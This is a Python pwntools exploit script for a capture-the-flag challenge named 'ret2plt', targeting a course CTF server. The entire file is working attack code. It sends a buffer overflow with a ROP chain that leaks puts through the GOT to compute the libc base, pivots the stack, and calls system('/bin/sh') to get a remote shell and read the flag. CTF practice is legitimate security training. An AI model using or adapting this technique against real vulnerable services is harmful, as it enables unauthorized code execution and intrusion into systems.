import time
from pwn import *
from struct import pack, unpack
LOCAL = False
binary = 'ret2plt'

r = None
if LOCAL:
    r = process(binary)
else:
    r = remote('csie.ctf.tw', 10131)

context.arch = 'amd64'

libc = ELF('libc.so.6')

BUF = 0x601600
GETS_PLT = 0x400672
PUTS_GOT = 0x601018
PUTS_PLT = 0x4004e0

pop_rdi = 0x4006f3
pop_rbp = 0x4005a0
leave_ret = 0x40068b
p = 'aaaaaaaabaaaaaaacaaaaaaadaaaaaaa' + p64(BUF)
p += flat([
pop_rdi, PUTS_GOT,
PUTS_PLT,
pop_rdi, BUF,
GETS_PLT,
])

#raw_input('pause')
r.sendline(p)
r.recvuntil('boom !\n')
#raw_input('pause')
leak = r.recvline().rstrip('\n')[::-1]
print leak
print len(leak)
print hex(int(leak.encode('hex'), 16))
libc_base = int(leak.encode('hex'), 16) - libc.symbols['puts']
print hex(libc_base)
#raw_input('pause')
p = '/bin/sh\x00'
p += flat([
pop_rdi, BUF,
libc_base + libc.symbols['system']
])
r.sendline(p)

time.sleep(0.2)
r.sendline('cat /home/' + binary + '/flag')
r.interactive()
